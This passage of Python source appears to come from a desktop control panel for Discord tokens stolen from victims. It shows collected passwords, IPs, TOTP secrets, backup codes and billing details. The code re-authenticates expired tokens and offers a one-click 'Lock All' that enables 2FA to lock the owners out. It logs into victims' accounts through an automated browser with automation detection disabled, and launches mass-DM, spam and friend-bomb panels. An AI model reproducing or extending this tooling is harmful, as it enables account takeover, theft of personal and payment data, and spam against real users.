        self._panel_buttons['friend_bomb'].pack(side="left", padx=3)
        self._panel_buttons['status'] = ctk.CTkButton(row1, text="✏️ Status", width=80, command=lambda: self._toggle_panel('status'), **sc, **bs)
        self._panel_buttons['status'].pack(side="left", padx=3)

        # Status label on right of row1
        self.status_lbl = ctk.CTkLabel(row1, text="", font=_F(FONT, 11), text_color=C['text_muted'])
        self.status_lbl.pack(side="right", padx=10)

        # Row 2 — secondary + utility
        self._panel_buttons['nick'] = ctk.CTkButton(row2, text="📝 Nicks", width=75, command=lambda: self._toggle_panel('nick'), **sc, **bs)
        self._panel_buttons['nick'].pack(side="left", padx=(0, 3))
        self._panel_buttons['hypesquad'] = ctk.CTkButton(row2, text="🏠 Hype", width=75, command=lambda: self._toggle_panel('hypesquad'), **sc, **bs)
        self._panel_buttons['hypesquad'].pack(side="left", padx=3)
        self._panel_buttons['leave_guild'] = ctk.CTkButton(row2, text="🚪 Leave", width=75, command=lambda: self._toggle_panel('leave_guild'), **sc, **bs)
        self._panel_buttons['leave_guild'].pack(side="left", padx=3)
        self._panel_buttons['bio'] = ctk.CTkButton(row2, text="📄 Bio", width=60, command=lambda: self._toggle_panel('bio'), **sc, **bs)
        self._panel_buttons['bio'].pack(side="left", padx=3)
        self._panel_buttons['display_name'] = ctk.CTkButton(row2, text="🏷️ Names", width=78, command=lambda: self._toggle_panel('display_name'), **sc, **bs)
        self._panel_buttons['display_name'].pack(side="left", padx=3)
        self._panel_buttons['expired'] = ctk.CTkButton(row2, text="🔄 Expired", width=80, command=lambda: self._toggle_panel('expired'),
                                                       fg_color='#dc2626', hover_color='#b91c1c', **bs)
        self._panel_buttons['expired'].pack(side="left", padx=3)
        ctk.CTkFrame(row2, fg_color=C['border'], width=1, height=24).pack(side="left", padx=8)
        ctk.CTkButton(row2, text="� Lock All", width=85, command=self._lock_all_2fa,
                      fg_color='#f59e0b', hover_color='#d97706', **bs).pack(side="left", padx=3)
        ctk.CTkButton(row2, text="�📋 Copy All", width=85, command=self._copy_all_valid, **sc, **bs).pack(side="left", padx=3)
        ctk.CTkButton(row2, text="💾 Save", width=65, command=self._save_tokens, **sc, **bs).pack(side="left", padx=3)

    def _make_stat(self, parent, value, label, color):
        frame = ctk.CTkFrame(parent, fg_color="transparent", width=100)
        frame.pack(side="left", padx=10)
        val_lbl = ctk.CTkLabel(frame, text=value, font=_F(FONT, 22, "bold"), text_color=color)
        val_lbl.pack()
        ctk.CTkLabel(frame, text=label, font=_F(FONT, 9, "bold"), text_color=C['text_muted']).pack()
        return val_lbl

    def _stat_sep(self, parent):
        ctk.CTkFrame(parent, fg_color=C['border'], width=1, height=40).pack(side="left", padx=2)

    # ━━━ Panel management — persistent with green highlight ━━━
    def _toggle_panel(self, key):
        if key in self._panels:
            panel = self._panels[key]
            try:
                if panel.winfo_exists():
                    panel.show(); return
            except: pass
            del self._panels[key]

        with self._lock: tokens = list(self.tokens)
        panel_classes = {
            'mass_dm': MassDMPanel, 'channel_spam': ChannelSpamPanel,
            'join_guild': JoinGuildPanel, 'voice': JoinVoicePanel,
            'friend_bomb': FriendBombPanel, 'status': StatusChangerPanel,
            'nick': NickChangerPanel, 'hypesquad': HypeSquadPanel,
            'leave_guild': LeaveGuildPanel, 'bio': BioChangerPanel,
            'display_name': DisplayNamePanel, 'expired': ExpiredTokensPanel,
        }
        cls = panel_classes.get(key)
        if cls:
            try:
                panel = cls(self, tokens)
                self._panels[key] = panel
                # Force window to appear (CTkToplevel sometimes stays hidden)
                panel.after(50, panel.show)
            except Exception as e:
                print(f'[panel] Failed to create {key}: {e}')

    def _panel_state_changed(self, key, running):
        if key in self._panel_buttons:
            btn = self._panel_buttons[key]
            try:
                if running:
                    btn.configure(fg_color=C['green'], hover_color=C['green_dim'])
                else:
                    if key in ('mass_dm', 'channel_spam'):
                        btn.configure(fg_color=C['accent'], hover_color=C['accent_hover'])
                    else:
                        btn.configure(fg_color=C['surface_2'], hover_color=C['card_hover'])
            except: pass

    # ━━━ Update system — split stats (cheap) from cards (expensive) ━━━
    def _safe_update_stats(self):
        """Schedule a stats-only update (cheap, <1ms)."""
        if self._destroyed: return
        if not self._stats_pending:
            self._stats_pending = True
            try: self.after(50, self._do_stats_update)
            except: self._stats_pending = False

    def _safe_update_ui(self):
        """Schedule both stats update AND card rebuild (debounced 400ms)."""
        if self._destroyed: return
        self._safe_update_stats()
        if not self._cards_pending:
            self._cards_pending = True
            try: self.after(400, self._do_cards_rebuild)
            except: self._cards_pending = False

    def _do_stats_update(self):
        self._stats_pending = False
        if not self._destroyed: self._update_stats()

    def _do_cards_rebuild(self):
        self._cards_pending = False
        if self._destroyed: return
        self._update_stats()
        self._rebuild_cards()

    def _update_stats(self):
        """Update stat labels only — instant, no widget creation/destruction."""
        try:
            with self._lock: tokens_copy = list(self.tokens)
            valid = [t for t in tokens_copy if t.valid is True]
            unchecked = sum(1 for t in tokens_copy if t.valid is None)

            self.stat_total.configure(text=str(len(tokens_copy)))
            self.stat_valid.configure(text=str(len(valid)))
            self.stat_nitro.configure(text=str(sum(1 for t in valid if t.nitro)))
            self.stat_billing.configure(text=str(sum(1 for t in valid if t.has_billing)))
            self.stat_mfa.configure(text=str(sum(1 for t in valid if t.mfa)))
            self.stat_phone.configure(text=str(sum(1 for t in valid if t.phone and t.phone != 'N/A')))
            self.stat_badges.configure(text=str(sum(1 for t in valid if t.badges > 0)))
            avg_f = round(sum(t.friend_count for t in valid) / max(len(valid), 1))
            self.stat_friends.configure(text=str(avg_f))
            self.stat_expired.configure(text=str(len(self.expired_tokens)))
            self.stat_recovered.configure(text=str(self.recovered_count))
            if unchecked > 0:
                self.stat_check.configure(text=f"{unchecked} left", text_color=C['yellow'])
            else:
                self.stat_check.configure(text="✓ Done", text_color=C['green'])
        except: pass

    def _rebuild_cards(self):
        """Destroy and recreate token cards — skips if token data hasn't changed."""
        if self._destroyed: return
        try:
            sorted_tokens = self._sorted_tokens()
            # Hash on identity + key display data to detect real changes
            data = tuple(
                (t.token[:20], t.valid, t.has_billing, t.nitro, t.username or '', t.badges)
                for t in sorted_tokens
            )
            new_hash = hash(data)
            if new_hash == self._card_token_hash:
                return  # No change — skip expensive rebuild
            self._card_token_hash = new_hash

            for w in self.scroll.winfo_children():
                try: w.destroy()
                except: pass

            for t in sorted_tokens:
                try: self._add_token_card(t)
                except Exception as e: print(f'[ui] Card error: {e}')
        except Exception as e:
            print(f'[ui] Rebuild error: {e}')

    # ━━━ Data fetching ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _start_fetch(self):
        self.btn_refresh.configure(state="disabled", text="...")
        threading.Thread(target=self._fetch_worker, daemon=True).start()

    def _fetch_worker(self):
        tokens = fetch_tokens_from_channel()
        with self._lock:
            existing = {t.token: t for t in self.tokens}
            for t in tokens:
                self._all_seen_tokens.add(t.token)
                if t.token in existing:
                    old = existing[t.token]
                    for attr in ('valid', 'user_id', 'username', 'display_name', 'email', 'phone',
                                 'password', 'nitro', 'nitro_type', 'mfa', 'badges', 'avatar_url', 'created_at',
                                 'last_checked', 'guilds_count', 'locale', 'verified',
                                 'bio', 'banner_color', 'has_billing', 'billing_country',
                                 'billing_type', 'billing_address', 'connections',
                                 'friend_count', 'dm_count'):
                        old_val = getattr(old, attr, None)
                        new_val = getattr(t, attr, None)
                        if old_val and (not new_val or new_val in (None, 'N/A', '', False, 0, [])):
                            setattr(t, attr, old_val)
            self.tokens = tokens
        self._safe_update_ui()
        try: self.after(0, lambda: self.btn_refresh.configure(state="normal", text="⟳  Refresh"))
        except: pass
        threading.Thread(target=self._check_all_validity, daemon=True).start()

    def _dedup_by_user(self):
        seen_users = {}; deduped = []
        for t in self.tokens:
            uid = t.user_id
            if not uid: deduped.append(t); continue
            if uid in seen_users:
                existing = seen_users[uid]
                # --- merge best fields from both entries ---
                if t.password and t.password != '?' and (not existing.password or existing.password == '?'):
                    existing.password = t.password
                if existing.password and existing.password != '?' and (not t.password or t.password == '?'):
                    t.password = existing.password
                if t.ip and t.ip != '?' and (not existing.ip or existing.ip == '?'):
                    existing.ip = t.ip
                if existing.ip and existing.ip != '?' and (not t.ip or t.ip == '?'):
                    t.ip = existing.ip
                if getattr(t, 'totp_secret', None) and not getattr(existing, 'totp_secret', None):
                    existing.totp_secret = t.totp_secret
                if getattr(existing, 'totp_secret', None) and not getattr(t, 'totp_secret', None):
                    t.totp_secret = existing.totp_secret
                if getattr(t, 'backup_codes', None) and not getattr(existing, 'backup_codes', None):
                    existing.backup_codes = t.backup_codes
                if getattr(existing, 'backup_codes', None) and not getattr(t, 'backup_codes', None):
                    t.backup_codes = existing.backup_codes
                # keep newer entry but with merged data
                if t.message_ts and existing.message_ts and t.message_ts > existing.message_ts:
                    deduped.remove(existing); deduped.append(t); seen_users[uid] = t
            else:
                seen_users[uid] = t; deduped.append(t)
        if len(deduped) < len(self.tokens):
            print(f'[dedup] Removed {len(self.tokens) - len(deduped)} duplicates')
        self.tokens = deduped
        for t in self.tokens: self._all_seen_tokens.add(t.token)

    def _check_all_validity(self):
        snapshot = list(self.tokens)
        if not snapshot: return
        done_count = [0]
        total = len(snapshot)

        def _check_one(t):
            try: t.check_validity()
            except: t.valid = False
            done_count[0] += 1
            return t

        with ThreadPoolExecutor(max_workers=VERIFY_WORKERS) as pool:
            futures = {pool.submit(_check_one, t): t for t in snapshot}
            for future in as_completed(futures):
                try: future.result()
                except: pass
                if done_count[0] % 4 == 0 or done_count[0] == total:
                    self._safe_update_stats()   # Stats ONLY during verification — no card rebuild

        with self._lock:
            expired = [t for t in self.tokens if t.valid is False]
            save_expired_tokens(expired)
            # Keep expired tokens in memory for recovery panel
            for t in expired:
                if not any(e.user_id == t.user_id and t.user_id for e in self.expired_tokens):
                    self.expired_tokens.append(t)
            self.tokens = [t for t in self.tokens if t.valid is not False]
            self._dedup_by_user()

        # Auto-attempt recovery for expired tokens that have credentials
        self._auto_recover_expired(expired)

        self._safe_update_ui()   # Full rebuild after filtering
        with self._lock:
            save_tokens_to_file(self.tokens)
        # Ding + scan (limited concurrency via pool)
        for t in list(self.tokens):
            if t.valid is True:
                if t.has_billing:
                    try: _play_ding()
                    except: pass
                self._scan_pool.submit(_scan_token_messages, t)

    def _startup_recover(self):
        """Auto-recover expired tokens loaded from token_data_old.txt at startup."""
        # Small delay to let UI finish building
        time.sleep(3)
        recoverable = [t for t in self.expired_tokens
                       if t.email and t.email not in ('', 'N/A')
                       and t.password and t.password not in ('', '?')
                       and t.totp_secret]
        if not recoverable:
            print(f'[startup] No recoverable expired tokens (need email + password + TOTP)')
            return
        print(f'[startup] Attempting recovery of {len(recoverable)} token(s) with TOTP...')
        self._auto_recover_expired(recoverable)

    def _auto_recover_expired(self, expired_list):
        """Attempt to re-authenticate expired tokens that have email + password + TOTP."""
        recoverable = [t for t in expired_list
                       if t.email and t.email not in ('', 'N/A')
                       and t.password and t.password not in ('', '?')]
        if not recoverable:
            return

        print(f'[recovery] Auto-recovering {len(recoverable)} expired token(s)...')
        for t in recoverable:
            uname = t.display_name or t.username or t.email or t.token[:12]
            try:
                new_token = _reauth_token(t)
                old_token = t.token
                t.token = new_token
                t.valid = True
                with _session_lock:
                    _stealth_sessions.pop(old_token, None)
                # Re-add to main token list
                with self._lock:
                    self.tokens.append(t)
                    # Remove from expired list
                    self.expired_tokens = [e for e in self.expired_tokens if e.user_id != t.user_id]
                # Re-verify to refresh data
                threading.Thread(target=t.check_validity, daemon=True).start()
                self.recovered_count += 1
                print(f'[recovery] ✅ {uname} recovered! New token: {new_token[:24]}...')
                self._safe_update_stats()
            except Exception as e:
                print(f'[recovery] ✗ {uname}: {e}')
            time.sleep(2)
        if any(t.valid is True for t in expired_list):
            self._safe_update_ui()
            with self._lock: save_tokens_to_file(self.tokens)

    def _start_auto_poll(self):
        def _loop():
            last_recheck = time.time()
            while self.auto_check_running:
                time.sleep(self._poll_interval)
                try:
                    new_tokens = fetch_tokens_from_channel()
                    added = 0
                    for nt in new_tokens:
                        if nt.token not in self._all_seen_tokens:
                            self._all_seen_tokens.add(nt.token)
                            try: nt.check_validity()
                            except: nt.valid = False
                            if nt.valid is True:
                                with self._lock:
                                    existing_uids = {t.user_id for t in self.tokens if t.user_id}
                                    if nt.user_id and nt.user_id in existing_uids: continue
                                    self.tokens.append(nt)
                                added += 1
                                if nt.has_billing:
                                    try: _play_ding()
                                    except: pass
                                self._scan_pool.submit(_scan_token_messages, nt)
                                # If voice panel is running with reconnect enabled, auto-join new token
                                try:
                                    vp = self._panels.get('voice')
                                    if (vp and vp._running and not vp.stopped
                                            and vp.reconnect_var.get() and vp._guild_id):
                                        if nt.token not in {t.token for t in vp.tokens}:
                                            vp.tokens.append(nt)
                                            ch_id = vp._vc_id or ''
                                            if ch_id:
                                                idx = len(vp.tokens)
                                                uname = nt.display_name or nt.username or nt.token[:12]
                                                vp.log(f"  [new] {uname} detected — joining VC...", 'accent')
                                                threading.Thread(
                                                    target=vp._connect_one_to,
                                                    args=(nt, idx, ch_id, vp._guild_id),
                                                    daemon=True).start()
                                except Exception as _ve:
                                    print(f'[vc-auto] {_ve}')
                    if added > 0:
                        self._safe_update_ui()
                        with self._lock: save_tokens_to_file(self.tokens)

                    if time.time() - last_recheck > 120:
                        last_recheck = time.time()
                        with self._lock: snapshot = list(self.tokens)
                        def _recheck(t):
                            try: t.check_validity()
                            except: t.valid = False
                        with ThreadPoolExecutor(max_workers=VERIFY_WORKERS) as pool:
                            pool.map(_recheck, snapshot)
                        with self._lock:
                            expired = [t for t in self.tokens if t.valid is False]
                            save_expired_tokens(expired)
                            for t in expired:
                                if not any(e.user_id == t.user_id and t.user_id for e in self.expired_tokens):
                                    self.expired_tokens.append(t)
                            self.tokens = [t for t in self.tokens if t.valid is not False]
                            self._dedup_by_user()
                        # Auto-recover in poll loop too
                        self._auto_recover_expired(expired)
                        self._safe_update_ui()
                        with self._lock: save_tokens_to_file(self.tokens)
                except Exception as e:
                    print(f'[poll] Error: {e}')
        threading.Thread(target=_loop, daemon=True).start()

    def _on_sort_change(self, choice):
        self._card_token_hash = None   # Force rebuild on sort change
        self._safe_update_ui()

    def _sorted_tokens(self):
        sort = self.sort_var.get()
        with self._lock: tokens = list(self.tokens)
        if sort == "⭐ Important":
            tokens.sort(key=lambda t: (-t.importance_score, t.username or ''))
        elif sort == "Nitro First":
            tokens.sort(key=lambda t: (not t.nitro, t.username or ''))
        elif sort == "Has Billing":
            tokens.sort(key=lambda t: (not t.has_billing, t.username or ''))
        elif sort == "Has Badges":
            tokens.sort(key=lambda t: (-t.badges, t.username or ''))
        elif sort == "Most Guilds":
            tokens.sort(key=lambda t: (-t.guilds_count, t.username or ''))
        elif sort == "Most Friends":
            tokens.sort(key=lambda t: (-t.friend_count, t.username or ''))
        elif sort == "Oldest First":
            tokens.sort(key=lambda t: (t.created_at or datetime.max.replace(tzinfo=timezone.utc)))
        elif sort == "Newest First":
            tokens.sort(key=lambda t: (t.message_ts or datetime.min.replace(tzinfo=timezone.utc)), reverse=True)
        return tokens

    # ━━━ Card builder — cleaner layout ━━━━━━━━━━━━━━━━━━━━━━━━
    def _add_token_card(self, t: TokenInfo):
        tier_name, tier_color = _get_tier(t)

        is_imp = t.is_important
        card = ctk.CTkFrame(self.scroll, fg_color=C['card'], corner_radius=12,
                            border_width=2 if is_imp else 1,
                            border_color=tier_color if is_imp else C['border'])
        card.pack(fill="x", padx=2, pady=4)

        # ── Banner ──
        banner = ctk.CTkFrame(card, fg_color=tier_color, height=32, corner_radius=0)
        banner.pack(fill="x"); banner.pack_propagate(False)

        # Tier label on left side of banner
        tier_labels = {'legendary': '⭐ Legendary', 'epic': '💎 Epic', 'rare': '🔷 Rare', 'common': ''}
        tier_text = tier_labels.get(tier_name, '')
        if tier_text:
            ctk.CTkLabel(banner, text=f" {tier_text}", font=_F(FONT, 9, "bold"),
                         text_color="#fff").pack(side="left", padx=8)

        pill_row = ctk.CTkFrame(banner, fg_color="transparent")
        pill_row.pack(side="right", padx=8, pady=5)
        if t.has_billing:
            self._pill(pill_row, f"\U0001f4b3 {t.billing_type or 'Billing'}", '#f97316')
        if t.nitro:
            self._pill(pill_row, f"\U0001f48e {t.nitro_label}", '#f47fff')
        if t.mfa:
            self._pill(pill_row, "\U0001f512 2FA", C['green_dim'])

        # ── Body ──
        body = ctk.CTkFrame(card, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=12, pady=(5, 8))

        # Avatar with status ring
        avatar_wrap = ctk.CTkFrame(body, fg_color="transparent", width=52, height=52)
        avatar_wrap.pack(side="left", padx=(0, 10)); avatar_wrap.pack_propagate(False)

        sc = C['green'] if t.valid is True else C['red'] if t.valid is False else C['yellow']
        ring = ctk.CTkFrame(avatar_wrap, fg_color=sc, width=52, height=52, corner_radius=26)
        ring.place(x=0, y=0); ring.pack_propagate(False)
        avatar_inner = ctk.CTkFrame(ring, fg_color=C['card'], width=48, height=48, corner_radius=24)
        avatar_inner.place(x=2, y=2); avatar_inner.pack_propagate(False)

        self._load_avatar_async(t.avatar_url, avatar_inner)

        # Info column
        info = ctk.CTkFrame(body, fg_color="transparent")
        info.pack(side="left", fill="both", expand=True)

        # Row 1: Display name + @username
        name_row = ctk.CTkFrame(info, fg_color="transparent"); name_row.pack(fill="x")
        name = t.display_name or t.username or 'Unknown'
        ctk.CTkLabel(name_row, text=name, font=_F(FONT, 14, "bold"),
                     text_color=C['text'], anchor="w").pack(side="left")
        if t.username and t.username != name:
            ctk.CTkLabel(name_row, text=f"  @{t.username}", font=_F(FONT, 10),
                         text_color=C['text_muted'], anchor="w").pack(side="left")
        if t.verified:
            ctk.CTkLabel(name_row, text=" \u2713", font=_F(FONT, 11, "bold"),
                         text_color=C['cyan']).pack(side="left", padx=(2, 0))

        # Row 2: Badge images
        badge_names = t.badge_names
        if t.nitro and 'Nitro' not in badge_names:
            ntype = {1: 'NitroClassic', 2: 'Nitro', 3: 'NitroBasic'}.get(t.nitro_type, 'Nitro')
            badge_names = [ntype] + [b for b in badge_names if b != 'None']
        actual_badges = [b for b in badge_names if b != 'None']
        if actual_badges:
            badge_row = ctk.CTkFrame(info, fg_color="transparent"); badge_row.pack(fill="x", pady=(1, 0))
            for bname in actual_badges[:8]:
                try:
                    bimg = _get_badge_image(bname, 18)
                    self._avatar_refs[f'badge_{bname}'] = bimg
                    friendly = BADGE_DISPLAY_NAMES.get(bname, bname)
                    blbl = ctk.CTkLabel(badge_row, text="", image=bimg, width=18, height=18)
                    blbl.pack(side="left", padx=(0, 2))
                    # Tooltip on hover
                    _tip = ctk.CTkLabel(badge_row, text=f" {friendly} ", font=_F(FONT, 9),
                                        fg_color=C['surface_2'], text_color=C['text'],
                                        corner_radius=6, height=20)
                    def _show(e, tip=_tip): tip.place(x=e.x_root - badge_row.winfo_rootx(), y=-22)
                    def _hide(e, tip=_tip): tip.place_forget()
                    blbl.bind('<Enter>', _show)
                    blbl.bind('<Leave>', _hide)
                except:
                    ctk.CTkLabel(badge_row, text=bname[:3], font=_F(MONO, 8),
                                 text_color=C['text_dim'], width=20).pack(side="left")

        # Row 3: Contact + region
        parts = []
        if t.email and t.email != 'N/A': parts.append(t.email)
        if t.phone and t.phone != 'N/A': parts.append(t.phone)
        locale_flag = _country_flag(t.locale) if t.locale else ''
        country_flag = _country_flag(t.billing_country) if t.billing_country else ''
        if locale_flag: parts.append(locale_flag)
        elif t.locale: parts.append(t.locale.upper())
        if country_flag and country_flag != locale_flag: parts.append(country_flag)
        if parts:
            ctk.CTkLabel(info, text="  \u00b7  ".join(parts), font=_F(FONT, 10),
                         text_color=C['text_2'], anchor="w").pack(fill="x", pady=(1, 0))

        # Row 4: Meta — age, servers, friends, connections, bio
        meta = [f"{t.created_str} ({t.age_str})"]
        if t.guilds_count: meta.append(f"{t.guilds_count} servers")
        if t.friend_count: meta.append(f"{t.friend_count} friends")
        if t.dm_count: meta.append(f"{t.dm_count} DMs")
        if t.connections:
            conn_str = '  '.join(
                CONN_ICONS.get(c['type'], '\u2022') + c.get('name', '')[:10]
                for c in t.connections[:4]
            )
            meta.append(conn_str)
        if t.bio:
            bio_short = t.bio[:35] + ('..' if len(t.bio) > 35 else '')
            meta.append(f'"{bio_short}"')
        ctk.CTkLabel(info, text="  \u00b7  ".join(meta), font=_F(MONO, 9),
                     text_color=C['text_muted'], anchor="w").pack(fill="x", pady=(1, 0))

        # Action buttons
        bf = ctk.CTkFrame(body, fg_color="transparent"); bf.pack(side="right", padx=(8, 0))
        bfs = {'width': 64, 'height': 24, 'corner_radius': 6}
        ctk.CTkButton(bf, text="Copy", fg_color=C['accent'], hover_color=C['accent_hover'],
                      font=_F(FONT, 9, "bold"),
                      command=lambda tk=t.token: self._copy_token(tk), **bfs).pack(pady=(0, 2))
        ctk.CTkButton(bf, text="Info", fg_color=C['surface_2'], hover_color=C['card_hover'],
                      font=_F(FONT, 9),
                      command=lambda tok=t: self._show_full_info(tok), **bfs).pack(pady=(0, 2))
        ctk.CTkButton(bf, text="Login", fg_color=C['green_dim'], hover_color=C['green'],
                      font=_F(FONT, 9, "bold"),
                      command=lambda tok=t: self._copy_login_script(tok), **bfs).pack()

    def _pill(self, parent, text, color):
        """Compact status pill on banner."""
        pf = ctk.CTkFrame(parent, fg_color=color, corner_radius=8, height=18)
        pf.pack(side="right", padx=(3, 0)); pf.pack_propagate(False)
        ctk.CTkLabel(pf, text=f" {text} ", font=_F(FONT, 8, "bold"),
                     text_color="#fff", height=18).pack(padx=2)

    def _load_avatar_async(self, url, frame):
        """Load avatar into frame — cached refs, non-blocking."""
        cache_key = url or '_default_'
        cached = self._avatar_refs.get(cache_key)
        if cached:
            try: ctk.CTkLabel(frame, text="", image=cached).place(x=0, y=0)
            except: pass
            return
        if not url:
            try:
                img = get_avatar_image('', 44)
                self._avatar_refs[cache_key] = img
                ctk.CTkLabel(frame, text="", image=img).place(x=0, y=0)
            except: pass
            return

        def _bg():
            try:
                img = get_avatar_image(url, 44)
                self._avatar_refs[cache_key] = img
                def _place():
                    try:
                        if not self._destroyed and frame.winfo_exists():
                            ctk.CTkLabel(frame, text="", image=img).place(x=0, y=0)
                    except: pass
                self.after(0, _place)
            except: pass
        threading.Thread(target=_bg, daemon=True).start()

    # ━━━ Info popup ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _show_full_info(self, t: TokenInfo):
        win = ctk.CTkToplevel(self)
        win.title(f"{t.display_name or t.username}")
        win.geometry("560x620")
        win.configure(fg_color=C['bg'])
        win.attributes('-topmost', True)

        sf = ctk.CTkScrollableFrame(win, fg_color=C['surface'], corner_radius=10)
        sf.pack(fill="both", expand=True, padx=12, pady=12)

        def _row(label, value, mono=False):
            r = ctk.CTkFrame(sf, fg_color="transparent"); r.pack(fill="x", padx=12, pady=2)
            ctk.CTkLabel(r, text=label, width=100, anchor="e",
                         font=_F(FONT, 11, "bold"), text_color=C['text_dim']).pack(side="left")
            ctk.CTkLabel(r, text=str(value), anchor="w",
                         font=_F(MONO if mono else FONT, 10),
                         text_color=C['text'], wraplength=360).pack(side="left", padx=(8, 0))

        _row("Username", f"{t.display_name} (@{t.username})")
        _row("User ID", t.user_id, True)
        _row("Email", t.email)
        _row("Phone", t.phone)
        _row("Password", t.password or '?', True)
        _row("IP", t.ip or '?')
        _row("Locale", t.locale or '?')
        _row("Verified", "✓ Yes" if t.verified else "No")
        _row("2FA", "🔒 Enabled" if t.mfa else "Disabled")
        if t.totp_secret:
            _row("TOTP Secret", t.totp_secret, True)
            # ── Live MFA code ──────────────────────────────────────────
            mfa_row = ctk.CTkFrame(sf, fg_color="transparent"); mfa_row.pack(fill="x", padx=12, pady=2)
            ctk.CTkLabel(mfa_row, text="MFA Code", width=100, anchor="e",
                         font=_F(FONT, 11, "bold"), text_color=C['text_dim']).pack(side="left")
            _mfa_code_var = ctk.StringVar(value="------")
            _mfa_code_lbl = ctk.CTkLabel(mfa_row, textvariable=_mfa_code_var, anchor="w",
                                         font=_F(MONO, 17, "bold"), text_color=C['green'])
            _mfa_code_lbl.pack(side="left", padx=(8, 10))
            _mfa_time_lbl = ctk.CTkLabel(mfa_row, text="", anchor="w",
                                         font=_F(FONT, 10), text_color=C['text_dim'])
            _mfa_time_lbl.pack(side="left")

            def _refresh_totp(secret=t.totp_secret, cv=_mfa_code_var, tl=_mfa_time_lbl, w=win):
                try:
                    if not w.winfo_exists():
                        return
                    secs_left = 30 - (int(time.time()) % 30)
                    code = pyotp.TOTP(secret).now()
                    cv.set(code)
                    tl.configure(text=f"({secs_left}s)")
                    w.after(1000, lambda: _refresh_totp(secret, cv, tl, w))
                except:
                    pass
            _refresh_totp()
            # ───────────────────────────────────────────────────────────
        if t.backup_codes:
            _row("Backup Codes", t.backup_codes, True)
        _row("Nitro", f"💎 {t.nitro_label}" if t.nitro else "None")
        _row("Badges", ', '.join(t.badge_names))
        _row("Created", f"{t.created_str} ({t.age_str})")
        _row("Guilds", str(t.guilds_count))
        _row("Friends", str(t.friend_count))
        _row("DM Channels", str(t.dm_count))

        ctk.CTkFrame(sf, fg_color=C['border'], height=1).pack(fill="x", padx=12, pady=4)
        billing_icon = "✅" if t.has_billing else "❌"
        _row("Billing", f"{billing_icon} {t.billing_type or 'None'}")
        if t.billing_address: _row("Address", t.billing_address)
        if t.billing_country: _row("Country", t.billing_country)

        ctk.CTkFrame(sf, fg_color=C['border'], height=1).pack(fill="x", padx=12, pady=4)
        if t.connections:
            for c in t.connections: _row(c['type'].title(), c['name'])
        else:
            _row("Connections", "None")

        if t.bio:
            ctk.CTkFrame(sf, fg_color=C['border'], height=1).pack(fill="x", padx=12, pady=4)
            _row("Bio", t.bio)

        ctk.CTkFrame(sf, fg_color=C['border'], height=1).pack(fill="x", padx=12, pady=4)
        _row("Token", t.token, True)
        _row("Captured", t.added_str)

        btns = ctk.CTkFrame(sf, fg_color="transparent"); btns.pack(fill="x", padx=12, pady=(8, 4))
        bs = {'height': 30, 'corner_radius': 8, 'font': _F(FONT, 10, "bold")}
        ctk.CTkButton(btns, text="📋 Copy Token", width=100, fg_color=C['accent'],
                      hover_color=C['accent_hover'],
                      command=lambda: self._copy_token(t.token), **bs).pack(side="left", padx=(0, 4))
        ctk.CTkButton(btns, text="🖥️ Browser", width=100, fg_color=C['green_dim'],
                      hover_color=C['green'],
                      command=lambda: self._copy_login_script(t), **bs).pack(side="left", padx=(0, 4))
        ctk.CTkButton(btns, text="🔃 Recheck", width=80, fg_color=C['surface_2'],
                      hover_color=C['card_hover'],
                      command=lambda: self._recheck_token(t), **bs).pack(side="left")

        # 2FA enable button — only show if has password and no MFA yet
        if t.password and t.password not in ('?', '') and not t.mfa:
            ctk.CTkFrame(sf, fg_color=C['border'], height=1).pack(fill="x", padx=12, pady=4)
            mfa_frame = ctk.CTkFrame(sf, fg_color="transparent"); mfa_frame.pack(fill="x", padx=12, pady=4)
            mfa_status = ctk.CTkLabel(mfa_frame, text="", font=_F(FONT, 10), text_color=C['text_muted'])
            mfa_status.pack(side="right", padx=8)
            def _do_enable_2fa(tok=t, lbl=mfa_status, w=win):
                lbl.configure(text="Enabling 2FA...", text_color=C['yellow'])
                def _run():
                    try:
                        result = enable_totp_2fa(tok.token, tok.password)
                        # Update token in memory
                        old_token = tok.token
                        tok.token = result['new_token']
                        tok.mfa = True
                        # Update tokens.txt
                        with self._lock:
                            save_tokens_to_file(self.tokens)
                        secret = result['secret']
                        codes = ', '.join(result['backup_codes'][:4])
                        self.after(0, lambda: lbl.configure(
                            text=f"✅ 2FA enabled! Secret: {secret}  Backups: {codes}",
                            text_color=C['green']))
                        self._safe_update_ui()
                        print(f'[2fa] Enabled for {tok.username} — new token: {tok.token[:20]}...')
                    except Exception as e:
                        self.after(0, lambda: lbl.configure(text=f"❌ {e}", text_color=C['red']))
                        print(f'[2fa] Failed for {tok.username}: {e}')
                threading.Thread(target=_run, daemon=True).start()
            ctk.CTkButton(mfa_frame, text="🔒 Enable 2FA", width=120, fg_color='#f59e0b',
                          hover_color='#d97706', font=_F(FONT, 10, "bold"),
                          command=_do_enable_2fa).pack(side="left")

    def _copy_login_script(self, t):
        self._flash_status(f"Opening browser for {t.display_name or t.username}...")
        threading.Thread(target=self._selenium_login_worker, args=(t,), daemon=True).start()

    def _selenium_login_worker(self, t):
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            opts = Options()
            opts.add_argument('--disable-blink-features=AutomationControlled')
            opts.add_experimental_option('excludeSwitches', ['enable-automation'])
            opts.add_experimental_option('useAutomationExtension', False)
            opts.add_experimental_option('detach', True)
            driver = webdriver.Chrome(options=opts)
            driver.execute_cdp_cmd('DOMStorage.enable', {})
            driver.get('https://discord.com/login')
            time.sleep(2)
            driver.execute_cdp_cmd('DOMStorage.setDOMStorageItem', {
                'storageId': {'securityOrigin': 'https://discord.com', 'isLocalStorage': True},
                'key': 'token', 'value': f'"{ t.token }"'
            })
            driver.refresh()
            self._flash_status(f"Logged in as {t.display_name or t.username}")
        except Exception as e:
            print(f'[selenium] Error: {e}')
            self._flash_status(f"Login failed: {e}")

    def _recheck_token(self, t):
        def _do():
            t.check_validity()
            self._safe_update_ui()
        threading.Thread(target=_do, daemon=True).start()
        self._flash_status("Rechecking...")

    def _lock_all_2fa(self):
        """Enable 2FA on ALL valid tokens that have a password and aren't already MFA'd."""
        with self._lock:
            eligible = [t for t in self.tokens
                        if t.valid is True and t.password and t.password not in ('?', '') and not t.mfa]
        if not eligible:
            self._flash_status("No eligible tokens (need password + no 2FA)")
            return
        total = len(eligible)
        self._flash_status(f"Enabling 2FA on {total} tokens...")
        def _worker():
            success = 0
            fail = 0
            for i, t in enumerate(eligible):
                try:
